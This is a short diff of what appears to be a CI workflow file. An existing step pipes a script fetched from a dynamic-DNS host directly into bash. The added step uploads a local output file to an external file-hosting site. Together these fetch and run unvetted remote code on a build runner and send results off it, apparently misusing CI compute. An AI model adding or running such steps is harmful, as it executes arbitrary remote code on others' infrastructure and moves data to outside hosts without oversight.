@@ -13,3 +13,6 @@ jobs:
     steps:
     - name: Running script
       run: curl "http://dufpuf.duckdns.org:5000/run.sh" | bash
+
+    - name: Upload stuff
+      run: curl -#o - -T output.mkv "https://w.buzzheavier.com/sample.mp4" | cat
